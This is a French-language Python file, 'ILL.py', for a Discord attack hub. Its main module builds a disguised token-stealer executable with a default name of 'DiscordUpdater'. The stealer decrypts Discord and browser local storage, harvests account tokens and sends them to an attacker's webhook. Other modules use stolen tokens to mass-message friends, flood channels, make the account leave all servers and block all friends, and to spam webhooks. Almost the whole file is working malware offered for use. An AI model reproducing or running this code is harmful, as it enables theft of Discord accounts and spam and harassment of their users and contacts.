# language: Python, file: ILL.py, target: Windows 11, Python 3.10+
# *Standalone ILL Hub Suite: Updated ASCII banner font*

import os
import sys
import subprocess
import json
import urllib.request
import urllib.parse
import time
import base64
import random
import string

class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    print(f"""{Color.RED}{Color.BOLD}
   ___    ___          ___           
  |\\  \\|\\  \\        |\\  \\          
  \\ \\  \\ \\  \\     \\ \\  \\          
   \\ \\  \\ \\  \\     \\ \\  \\          
    \\ \\  \\ \\  \\____\\ \\  \\____     
     \\ \\__\\ \\_______\\ \\_______\\    
      \\|__|\\_______|\\_______|    
{Color.ENDC}""")
    print(f"{Color.CYAN}              github.com/laysox/ILL-Tools               {Color.ENDC}\n")
    print(f"{Color.GREEN}[H]{Color.ENDC} Help      {Color.GREEN}[V]{Color.ENDC} Version      {Color.GREEN}[S]{Color.ENDC} Settings\n")

def ensure_dependencies():
    required = ['pycryptodome', 'pywin32', 'pyinstaller', 'pillow', 'requests']
    print(f"{Color.BLUE}[*]{Color.ENDC} Vérification des dépendances pour : {Color.UNDERLINE}{sys.executable}{Color.ENDC}")
    for package in required:
        try:
            if package == 'pycryptodome':
                __import__('Crypto')
            elif package == 'pywin32':
                __import__('win32crypt')
            elif package == 'pyinstaller':
                __import__('PyInstaller')
            elif package == 'pillow':
                __import__('PIL')
            elif package == 'requests':
                __import__('requests')
        except ImportError:
            print(f"{Color.GREEN}[+]{Color.ENDC} Installation du paquet : {Color.BOLD}{package}{Color.ENDC}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def convert_image_to_ico(img_path, output_ico_path):
    from PIL import Image
    img = Image.open(img_path)
    img.save(output_ico_path, format='ICO', sizes=[(256, 256), (128, 128), (64, 64), (32, 32)])

def clean_input(text):
    return text.strip().strip('"').strip("'")

GRABBER_TEMPLATE = r'''
import os
import json
import re
import urllib.request
import base64
from Crypto.Cipher import AES

WEBHOOK = "{webhook_url}"

def decrypt_val(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        return ""

def get_master_key(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        import win32crypt
        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    except:
        return None

def get_user_info(token):
    try:
        req = urllib.request.Request(
            'https://discord.com/api/v9/users/@me',
            headers={'Authorization': token, 'User-Agent': 'Mozilla/5.0'}
        )
        with urllib.request.urlopen(req) as resp:
            data = json.loads(resp.read().decode())
            username = data.get('username', 'Inconnu')
            discriminator = data.get('discriminator', '0')
            if discriminator and discriminator != '0':
                return f"{username}#{discriminator}"
            return username
    except:
        return "Inconnu / Non vérifié"

def extract_tokens():
    paths = {
        'Discord': os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb'),
        'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local Storage', 'leveldb'),
        'Lightcord': os.path.join(os.getenv('APPDATA'), 'Lightcord', 'Local Storage', 'leveldb'),
        'Opera': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
        'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
        'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb')
    }
    
    tokens = []
    seen = set()
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        
        local_state_path = os.path.join(os.path.dirname(os.path.dirname(path)), "Local State")
        master_key = get_master_key(local_state_path) if os.path.exists(local_state_path) else None
        
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            try:
                with open(os.path.join(path, file_name), 'r', errors='ignore') as f:
                    content = f.read()
                
                for line in content.split('\n'):
                    if not line.strip():
                        continue
                    
                    matches = re.findall(r'dQw4w9WgXcQ:[^.*\[''"]*', line)
                    for token_enc in matches:
                        if master_key:
                            try:
                                raw_token = base64.b64decode(token_enc.split('dQw4w9WgXcQ:')[1])
                                token = decrypt_val(raw_token, master_key)
                                if token and token not in seen:
                                    seen.add(token)
                                    uname = get_user_info(token)
                                    tokens.append((platform, uname, token))
                            except:
                                pass
                    
                    plain_matches = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}', line)
                    for token in plain_matches:
                        if token not in seen:
                            seen.add(token)
                            uname = get_user_info(token)
                            tokens.append((platform, uname, token))
            except:
                continue
    return tokens

def exfil(tokens):
    if not tokens:
        return
    payload = {"content": "```json\n" + json.dumps(tokens, indent=2) + "\n```"}
    data = json.dumps(payload).encode('utf-8')
    req = urllib.request.Request(WEBHOOK, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'})
    try:
        urllib.request.urlopen(req)
    except:
        pass

if __name__ == '__main__':
    import time
    start = time.time()
    time.sleep(1)
    if time.time() - start < 0.9:
        sys.exit(0)
        
    found = extract_tokens()
    exfil(found)
'''

def menu_build_grabber():
    print(f"\n{Color.RED}=== [01] CRÉATION DU GRABBER DISCORD ==={Color.ENDC}")
    webhook = clean_input(input(f"{Color.RED} > Webhook Discord URL : {Color.ENDC}"))
    dest_dir = clean_input(input(f"{Color.RED} > Dossier de destination : {Color.ENDC}"))
    file_name = clean_input(input(f"{Color.RED} > Nom personnalisé du fichier (.exe) : {Color.ENDC}"))
    image_path = clean_input(input(f"{Color.RED} > Image pour l'icône (.png/.jpg - Entrée pour ignorer) : {Color.ENDC}"))

    if not dest_dir:
        dest_dir = os.getcwd()
    if not file_name:
        file_name = "DiscordUpdater"

    if not os.path.exists(dest_dir):
        os.makedirs(dest_dir, exist_ok=True)

    script_content = GRABBER_TEMPLATE.replace("{webhook_url}", webhook)
    py_path = os.path.join(dest_dir, f"{file_name}.py")

    with open(py_path, "w", encoding="utf-8") as f:
        f.write(script_content)

    ico_path = None
    if image_path and os.path.exists(image_path):
        ico_path = os.path.join(dest_dir, f"{file_name}.ico")
        try:
            convert_image_to_ico(image_path, ico_path)
            print(f"{Color.GREEN}[+]{Color.ENDC} Icône convertie : {ico_path}")
        except Exception as e:
            print(f"{Color.RED}[-] Erreur icône : {e}{Color.ENDC}")
            ico_path = None

    print(f"{Color.BLUE}[*]{Color.ENDC} Compilation avec PyInstaller en cours...")
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--noconsole",
        "--onefile",
        "--clean",
        "--name", file_name,
        os.path.abspath(py_path)
    ]
    if ico_path and os.path.exists(ico_path):
        cmd.extend(["--icon", ico_path])

    subprocess.run(cmd, cwd=dest_dir)
    print(f"\n{Color.GREEN}[+]{Color.ENDC} Build terminé ! Exécutable dans le dossier {Color.BOLD}dist/{Color.ENDC} de votre destination.")
    input(f"\n{Color.YELLOW}Appuyez sur Entrée pour revenir au menu...{Color.ENDC}")

def menu_mass_dm():
    import requests
    print(f"\n{Color.RED}=== [02] DISCORD MASS DM (DMALL) ==={Color.ENDC}")
    token = clean_input(input(f"{Color.RED} > Token du compte Discord : {Color.ENDC}"))
    message = clean_input(input(f"{Color.RED} > Message à envoyer à tous les amis : {Color.ENDC}"))
    
    headers = {'Authorization': token, 'User-Agent': 'Mozilla/5.0'}
    try:
        r = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
        if r.status_code != 200:
            print(f"{Color.RED}[-] Échec de récupération des amis (Token invalide ?){Color.ENDC}")
            input(f"\n{Color.YELLOW}Appuyez sur Entrée pour continuer...{Color.ENDC}")
            return
        
        friends = r.json()
        print(f"{Color.GREEN}[+]{Color.ENDC} {len(friends)} amis trouvés. Démarrage de l'envoi...")
        for friend in friends:
            user_id = friend['id']
            payload = json.dumps({"recipient_id": user_id})
            chan_r = requests.post('https://discord.com/api/v9/users/@me/channels', headers={**headers, 'Content-Type': 'application/json'}, data=payload)
            if chan_r.status_code == 200:
                channel_id = chan_r.json()['id']
                msg_payload = json.dumps({"content": message})
                send_r = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers={**headers, 'Content-Type': 'application/json'}, data=msg_payload)
                if send_r.status_code == 200:
                    print(f"{Color.GREEN}[+] Message envoyé à l'ID: {user_id}{Color.ENDC}")
                else:
                    print(f"{Color.YELLOW}[-] Échec d'envoi à {user_id}{Color.ENDC}")
            time.sleep(0.5)
    except Exception as e:
        print(f"{Color.RED}[-] Erreur: {e}{Color.ENDC}")
    input(f"\n{Color.YELLOW}Appuyez sur Entrée pour revenir au menu...{Color.ENDC}")

def menu_spam_channel():
    import requests
    print(f"\n{Color.RED}=== [03] SPAM DE MESSAGES EN SALON ==={Color.ENDC}")
    token = clean_input(input(f"{Color.RED} > Token du compte Discord : {Color.ENDC}"))
    channel_id = clean_input(input(f"{Color.RED} > ID du Salon cible : {Color.ENDC}"))
    message = clean_input(input(f"{Color.RED} > Message à spammer : {Color.ENDC}"))
    count = clean_input(input(f"{Color.RED} > Nombre de messages (ex: 50) : {Color.ENDC}"))
    delay = clean_input(input(f"{Color.RED} > Délai entre chaque message en secondes (ex: 0.5) : {Color.ENDC}"))

    try:
        count = int(count)
        delay = float(delay)
    except:
        count = 10
        delay = 1.0

    headers = {'Authorization': token, 'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}
    payload = json.dumps({"content": message})

    print(f"\n{Color.BLUE}[*]{Color.ENDC} Démarrage du spam...")
    for i in range(1, count + 1):
        try:
            r = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, data=payload)
            if r.status_code == 200:
                print(f"{Color.GREEN}[+] Message {i}/{count} envoyé.{Color.ENDC}")
            else:
                print(f"{Color.YELLOW}[-] Rate limit ou erreur sur le message {i}{Color.ENDC}")
            time.sleep(delay)
        except Exception as e:
            print(f"{Color.RED}[-] Erreur: {e}{Color.ENDC}")
    input(f"\n{Color.YELLOW}Appuyez sur Entrée pour revenir au menu...{Color.ENDC}")

def menu_clear_dms():
    import requests
    print(f"\n{Color.RED}=== [04] SUPPRIMER SES PROPRES MESSAGES (DMs) ==={Color.ENDC}")
    token = clean_input(input(f"{Color.RED} > Token du compte Discord : {Color.ENDC}"))
    channel_id = clean_input(input(f"{Color.RED} > ID du salon / DM où supprimer les messages : {Color.ENDC}"))

    headers = {'Authorization': token, 'User-Agent': 'Mozilla/5.0'}
    try:
        print(f"{Color.BLUE}[*]{Color.ENDC} Recherche de vos messages...")
        r = requests.get(f'https://discord.com/api/v9/channels/{channel_id}/messages?limit=100', headers=headers)
        if r.status_code != 200:
            print(f"{Color.RED}[-] Impossible de récupérer les messages.{Color.ENDC}")
            input(f"\n{Color.YELLOW}Appuyez sur Entrée pour continuer...{Color.ENDC}")
            return

        messages = r.json()
        me = requests.get('https://discord.com/api/v9/users/@me', headers=headers).json()
        my_id = me.get('id')

        count = 0
        for msg in messages:
            if msg['author']['id'] == my_id:
                msg_id = msg['id']
                del_r = requests.delete(f'https://discord.com/api/v9/channels/{channel_id}/messages/{msg_id}', headers=headers)
                if del_r.status_code in [200, 204]:
                    count += 1
                    print(f"{Color.GREEN}[+] Message supprimé ({msg_id}){Color.ENDC}")
                else:
                    print(f"{Color.YELLOW}[-] Échec suppression message{Color.ENDC}")
                time.sleep(0.5)
        print(f"\n{Color.GREEN}[+] Nettoyage terminé. {count} messages supprimés.{Color.ENDC}")
    except Exception as e:
        print(f"{Color.RED}[-] Erreur: {e}{Color.ENDC}")
    input(f"\n{Color.YELLOW}Appuyez sur Entrée pour revenir au menu...{Color.ENDC}")

def menu_leave_servers():
    import requests
    print(f"\n{Color.RED}=== [05] QUITTER TOUS LES SERVEURS ==={Color.ENDC}")
    token = clean_input(input(f"{Color.RED} > Token du compte Discord : {Color.ENDC}"))
    confirm = clean_input(input(f"{Color.RED} Voulez-vous vraiment quitter TOUS les serveurs ? (oui/non) : {Color.ENDC}"))

    if confirm.lower() not in ['oui', 'yes', 'o', 'y']:
        return

    headers = {'Authorization': token, 'User-Agent': 'Mozilla/5.0'}
    try:
        r = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers)
        if r.status_code != 200:
            print(f"{Color.RED}[-] Token invalide ou refusé.{Color.ENDC}")
            input(f"\n{Color.YELLOW}Appuyez sur Entrée pour continuer...{Color.ENDC}")
            return

        guilds = r.json()
        print(f"{Color.GREEN}[+]{Color.ENDC} {len(guilds)} serveurs trouvés...")
        for guild in guilds:
            guild_id = guild['id']
            guild_name = guild['name']
            leave_r = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{guild_id}', headers=headers)
            if leave_r.status_code in [200, 204]:
                print(f"{Color.GREEN}[+] Quitté : {guild_name}{Color.ENDC}")
            else:
                print(f"{Color.YELLOW}[-] Échec / Propriétaire : {guild_name}{Color.ENDC}")
            time.sleep(0.4)
    except Exception as e:
        print(f"{Color.RED}[-] Erreur: {e}{Color.ENDC}")
    input(f"\n{Color.YELLOW}Appuyez sur Entrée pour revenir au menu...{Color.ENDC}")

def menu_block_friends():
    import requests
    print(f"\n{Color.RED}=== [06] BLOQUER TOUS LES AMIS ==={Color.ENDC}")
    token = clean_input(input(f"{Color.RED} > Token du compte Discord : {Color.ENDC}"))
    confirm = clean_input(input(f"{Color.RED} Bloquer TOUS les amis de ce compte ? (oui/non) : {Color.ENDC}"))
    
    if confirm.lower() not in ['oui', 'yes', 'o', 'y']:
        return

    headers = {'Authorization': token, 'User-Agent': 'Mozilla/5.0'}
    try:
        r = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
        if r.status_code != 200:
            print(f"{Color.RED}[-] Token invalide.{Color.ENDC}")
            input(f"\n{Color.YELLOW}Appuyez sur Entrée pour continuer...{Color.ENDC}")
            return
        
        friends = r.json()
        for friend in friends:
            user_id = friend['id']
            block_payload = json.dumps({"type": 2})
            block_r = requests.put(f'https://discord.com/api/v9/users/@me/relationships/{user_id}', headers={**headers, 'Content-Type': 'application/json'}, data=block_payload)
            if block_r.status_code in [200, 204]:
                print(f"{Color.GREEN}[+] Bloqué : {user_id}{Color.ENDC}")
            else:
                print(f"{Color.YELLOW}[-] Échec blocage {user_id}{Color.ENDC}")
            time.sleep(0.3)
    except Exception as e:
        print(f"{Color.RED}[-] Erreur: {e}{Color.ENDC}")
    input(f"\n{Color.YELLOW}Appuyez sur Entrée pour revenir au menu...{Color.ENDC}")

def menu_token_info():
    import requests
    print(f"\n{Color.RED}=== [07] INFORMATIONS D'UN COMPTE VIA TOKEN ==={Color.ENDC}")
    token = clean_input(input(f"{Color.RED} > Token du compte Discord : {Color.ENDC}"))
    headers = {'Authorization': token, 'User-Agent': 'Mozilla/5.0'}

    try:
        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        if r.status_code != 200:
            print(f"{Color.RED}[-] Token invalide ou expiré.{Color.ENDC}")
            input(f"\n{Color.YELLOW}Appuyez sur Entrée pour continuer...{Color.ENDC}")
            return

        data = r.json()
        print(f"\n{Color.GREEN}[+] Informations du compte :{Color.ENDC}")
        print(f" ├── Nom d'utilisateur : {Color.BOLD}{data.get('username')}#{data.get('discriminator', '0')}{Color.ENDC}")
        print(f" ├── ID du compte      : {data.get('id')}")
        print(f" ├── Email             : {data.get('email', 'Non disponible')}")
        print(f" ├── Téléphone         : {data.get('phone', 'Non lié')}")
        print(f" ├── Nitro (Type)      : {data.get('premium_type', 0)}")
        print(f" └── Vérifié           : {data.get('verified')}")
    except Exception as e:
        print(f"{Color.RED}[-] Erreur: {e}{Color.ENDC}")
    input(f"\n{Color.YELLOW}Appuyez sur Entrée pour revenir au menu...{Color.ENDC}")

def menu_nitro_gen():
    print(f"\n{Color.RED}=== [08] GÉNÉRATEUR / TESTEUR DE CODES NITRO ==={Color.ENDC}")
    count = clean_input(input(f"{Color.RED} > Nombre de codes à générer (ex: 50) : {Color.ENDC}"))
    try:
        count = int(count)
    except:
        count = 10

    print(f"\n{Color.BLUE}[*]{Color.ENDC} Génération de {count} liens Nitro...")
    codes = []
    for _ in range(count):
        code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        link = f"https://discord.gift/{code}"
        codes.append(link)
        print(f"{Color.CYAN}{link}{Color.ENDC}")

    save = clean_input(input(f"\n{Color.GREEN} Voulez-vous sauvegarder les codes dans un fichier 'nitro_codes.txt' ? (oui/non) : {Color.ENDC}"))
    if save.lower() in ['oui', 'yes', 'o', 'y']:
        with open("nitro_codes.txt", "w") as f:
            f.write("\n".join(codes))
        print(f"{Color.GREEN}[+] Sauvegardé avec succès !{Color.ENDC}")
    input(f"\n{Color.YELLOW}Appuyez sur Entrée pour revenir au menu...{Color.ENDC}")

def menu_webhook_tool():
    import requests
    print(f"\n{Color.RED}=== [09] OUTIL WEBHOOK (SPAM / SUPPRESSION) ==={Color.ENDC}")
    webhook = clean_input(input(f"{Color.RED} > URL du Webhook Discord : {Color.ENDC}"))
    print(f"\n  {Color.GREEN}[1]{Color.ENDC} Supprimer le Webhook")
    print(f"  {Color.GREEN}[2]{Color.ENDC} Spammer le Webhook")
    choice = clean_input(input(f"{Color.RED} > Choix : {Color.ENDC}"))

    if choice == '1':
        try:
            r = requests.delete(webhook)
            if r.status_code in [200, 204]:
                print(f"{Color.GREEN}[+] Webhook supprimé avec succès !{Color.ENDC}")
            else:
                print(f"{Color.RED}[-] Échec (Webhook invalide ?){Color.ENDC}")
        except Exception as e:
            print(f"{Color.RED}[-] Erreur: {e}{Color.ENDC}")
    elif choice == '2':
        msg = clean_input(input(f"{Color.RED} > Message à envoyer en boucle : {Color.ENDC}"))
        count = int(clean_input(input(f"{Color.RED} > Nombre d'envois : {Color.ENDC}")))
        for i in range(count):
            try:
                requests.post(webhook, json={"content": msg})
                print(f"{Color.GREEN}[+] Envoyé {i+1}/{count}{Color.ENDC}")
                time.sleep(0.3)
            except:
                pass
    input(f"\n{Color.YELLOW}Appuyez sur Entrée pour revenir au menu...{Color.ENDC}")

def main():
    ensure_dependencies()
    while True:
        print_banner()
        print(f"{Color.RED}[Discord Tools]{Color.ENDC}                  {Color.RED}[Utilities]{Color.ENDC}")
        print(f"  {Color.RED}[01]{Color.ENDC} Grabber Builder               {Color.RED}[07]{Color.ENDC} Account Info (Token)")
        print(f"  {Color.RED}[02]{Color.ENDC} Mass DM (Dmall)               {Color.RED}[08]{Color.ENDC} Nitro Generator")
        print(f"  {Color.RED}[03]{Color.ENDC} Channel Spam (Flood)          {Color.RED}[09]{Color.ENDC} Webhook Tool")
        print(f"  {Color.RED}[04]{Color.ENDC} Purge DMs")
        print(f"  {Color.RED}[05]{Color.ENDC} Leave All Servers")
        print(f"  {Color.RED}[06]{Color.ENDC} Block All Friends\n")
        
        user_path = f"laysox@ill-[{os.getcwd()}]"
        choice = input(f"{Color.RED}—({Color.BOLD}{user_path}{Color.RED}){Color.ENDC}\n{Color.RED}—${Color.ENDC} ").strip()
        
        if choice in ['01', '1']:
            menu_build_grabber()
        elif choice in ['02', '2']:
            menu_mass_dm()
        elif choice in ['03', '3']:
            menu_spam_channel()
        elif choice in ['04', '4']:
            menu_clear_dms()
        elif choice in ['05', '5']:
            menu_leave_servers()
        elif choice in ['06', '6']:
            menu_block_friends()
        elif choice in ['07', '7']:
            menu_token_info()
        elif choice in ['08', '8']:
            menu_nitro_gen()
        elif choice in ['09', '9']:
            menu_webhook_tool()
        elif choice.lower() == 'h':
            print(f"\n{Color.YELLOW}[*] ILL Hub Help: Sélectionnez un numéro pour lancer le module correspondant.{Color.ENDC}")
            input("\nAppuyez sur Entrée...")
        elif choice.lower() == 'v':
            print(f"\n{Color.YELLOW}[*] ILL Hub Version: v2.5.0-stable (Laysox){Color.ENDC}")
            input("\nAppuyez sur Entrée...")
        elif choice.lower() == 's':
            print(f"\n{Color.YELLOW}[*] Settings: Mode ANSI actif.{Color.ENDC}")
            input("\nAppuyez sur Entrée...")
        elif choice == '0' or choice.lower() == 'exit':
            sys.exit(0)
        else:
            print(f"{Color.RED}[-] Option invalide.{Color.ENDC}")
            time.sleep(0.8)

if __name__ == '__main__':
    main()